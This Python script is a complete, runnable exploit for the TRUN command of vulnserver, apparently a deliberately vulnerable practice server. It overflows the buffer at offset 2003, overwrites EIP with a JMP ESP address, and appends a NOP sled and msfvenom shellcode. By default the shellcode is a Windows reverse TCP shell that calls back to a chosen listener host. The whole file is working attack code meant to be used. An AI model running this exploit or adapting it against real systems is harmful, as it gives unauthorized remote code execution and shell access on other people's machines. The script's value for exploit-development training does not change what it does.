#!/usr/bin/env python3
from __future__ import annotations

import argparse
import shutil
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass
from typing import Literal

PayloadKind = Literal["calc", "reverse"]


@dataclass(frozen=True)
class ExploitConfig:
    target_ip: str
    target_port: int
    offset: int
    jmp_esp_addr: int
    sled_len: int
    badchars: bytes
    payload_kind: PayloadKind
    lhost: str | None
    lport: int | None
    add_crlf: bool
    timeout: float
    verbose: bool


def parse_badchars(s: str) -> bytes:
    """
    Parse a string like "\\x00\\x0a\\x0d" into raw bytes b"\\x00\\x0a\\x0d".
    """
    s = s.strip()
    if not s:
        return b""
    # Allow either "\x.." sequences or hex bytes separated by commas/spaces.
    if "\\x" in s:
        out = bytearray()
        parts = s.split("\\x")
        for part in parts:
            if not part:
                continue
            hx = part[:2]
            out.append(int(hx, 16))
            rest = part[2:]
            if rest.strip():
                # If user accidentally provided extra characters, fail loudly.
                raise ValueError(f"Invalid badchar segment after \\x{hx}: {rest!r}")
        return bytes(out)

    # Fallback: "00 0a 0d" or "00,0a,0d"
    cleaned = s.replace(",", " ").split()
    return bytes(int(x, 16) for x in cleaned)


def run_msfvenom(args: list[str], verbose: bool) -> bytes:
    if shutil.which("msfvenom") is None:
        raise RuntimeError("msfvenom not found in PATH")

    if verbose:
        print(f"[i] msfvenom cmd: {' '.join(args)}", file=sys.stderr)

    proc = subprocess.run(args, capture_output=True, check=False)
    if proc.returncode != 0:
        stderr = proc.stderr.decode(errors="replace")
        raise RuntimeError(f"msfvenom failed (rc={proc.returncode}):\n{stderr}")

    return proc.stdout


def generate_shellcode(cfg: ExploitConfig) -> bytes:
    bad = cfg.badchars
    bad_str = "".join(f"\\x{b:02x}" for b in bad)

    if cfg.payload_kind == "calc":
        cmd = [
            "msfvenom",
            "-p",
            "windows/exec",
            "CMD=calc.exe",
            "EXITFUNC=thread",
            "-f",
            "raw",
        ]
        if bad:
            cmd += ["-b", bad_str]
        return run_msfvenom(cmd, cfg.verbose)

    if cfg.payload_kind == "reverse":
        if not cfg.lhost or not cfg.lport:
            raise ValueError("reverse payload requires --lhost and --lport")

        cmd = [
            "msfvenom",
            "-p",
            "windows/shell_reverse_tcp",
            f"LHOST={cfg.lhost}",
            f"LPORT={cfg.lport}",
            "EXITFUNC=thread",
            "-f",
            "raw",
        ]
        if bad:
            cmd += ["-b", bad_str]
        return run_msfvenom(cmd, cfg.verbose)

    raise ValueError(f"Unsupported payload kind: {cfg.payload_kind}")


def build_payload(cfg: ExploitConfig, shellcode: bytes) -> bytes:
    """
    TRUN /.:/<A*offset><EIP=jmp esp><NOP sled><shellcode>[CRLF?]
    """
    eip = struct.pack("<I", cfg.jmp_esp_addr)
    sled = b"\x90" * cfg.sled_len

    payload = b"TRUN /.:/" + (b"A" * cfg.offset) + eip + sled + shellcode
    if cfg.add_crlf:
        payload += b"\r\n"
    return payload


def hexdump_preview(buf: bytes, start: int, length: int) -> str:
    chunk = buf[start : start + length]
    return chunk.hex()


def send_payload(cfg: ExploitConfig, payload: bytes) -> None:
    with socket.create_connection(
        (cfg.target_ip, cfg.target_port), timeout=cfg.timeout
    ) as s:
        s.sendall(payload)


def parse_args() -> ExploitConfig:
    p = argparse.ArgumentParser(description="vulnserver TRUN exploit runner (JMP ESP)")

    p.add_argument("--target-ip", required=True, type=str)
    p.add_argument("--target-port", type=int, default=9999)

    p.add_argument("--offset", type=int, default=2003)
    p.add_argument(
        "--jmp-esp",
        type=lambda x: int(x, 0),
        default=0x625011AF,
        help="e.g. 0x625011AF",
    )

    p.add_argument("--sled", type=int, default=32)
    p.add_argument("--badchars", type=str, default="\\x00\\x0a\\x0d")

    p.add_argument("--payload", choices=["calc", "reverse"], default="reverse")
    p.add_argument("--lhost", type=str, default=None)
    p.add_argument("--lport", type=int, default=4444)

    p.add_argument("--crlf", action="store_true", help="Append \\r\\n")
    p.add_argument("--timeout", type=float, default=3.0)
    p.add_argument("-v", "--verbose", action="store_true")

    ns = p.parse_args()

    bad = parse_badchars(ns.badchars)

    return ExploitConfig(
        target_ip=ns.target_ip,
        target_port=ns.target_port,
        offset=ns.offset,
        jmp_esp_addr=ns.jmp_esp,
        sled_len=ns.sled,
        badchars=bad,
        payload_kind=ns.payload,
        lhost=ns.lhost,
        lport=ns.lport,
        add_crlf=ns.crlf,
        timeout=ns.timeout,
        verbose=ns.verbose,
    )


def main() -> int:
    cfg = parse_args()

    shellcode = generate_shellcode(cfg)

    # Hard fail if badchars are present (if you asked msfvenom to avoid them).
    for b in cfg.badchars:
        if bytes([b]) in shellcode:
            raise RuntimeError(f"Shellcode still contains bad char: 0x{b:02x}")

    payload = build_payload(cfg, shellcode)

    # Preview bytes around the EIP overwrite boundary (sanity check)
    # Note: TRUN prefix is 9 bytes: len(b"TRUN /.:/") == 9
    prefix_len = len(b"TRUN /.:/")
    preview_at = prefix_len + cfg.offset
    print(f"[i] Shellcode length: {len(shellcode)}", file=sys.stderr)
    print(
        f"[i] EIP bytes preview: {hexdump_preview(payload, preview_at, 8)}",
        file=sys.stderr,
    )

    if cfg.verbose:
        print(f"[i] Total payload length: {len(payload)}", file=sys.stderr)

    send_payload(cfg, payload)
    print("[+] Payload sent", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
